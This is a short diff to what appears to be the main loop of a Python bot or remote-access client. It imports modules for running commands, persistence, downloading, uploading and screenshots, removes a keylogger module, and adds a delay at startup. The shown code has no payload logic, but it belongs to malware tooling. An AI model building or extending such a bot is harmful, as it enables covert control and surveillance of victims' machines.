@@ -15,11 +15,10 @@ from modules import runcmd
 from modules import persistence
 from modules import download
 from modules import upload
-from modules import keylogger
 from modules import screenshot
 
 
-MODULES = ['runcmd', 'persistence', 'download', 'upload', 'keylogger', 'screenshot']
+MODULES = ['runcmd', 'persistence', 'download', 'upload', 'screenshot']
 if not settings.BOT_ID:
     settings.BOT_ID = socket.gethostname()
 if not utils.validate_botid(settings.BOT_ID):
@@ -48,6 +47,7 @@ General commands:
 
 
 if __name__ == "__main__":
+    time.sleep(settings.PAUSE_AT_START)
     last_active = time.time()
     is_idle = False
     while 1:
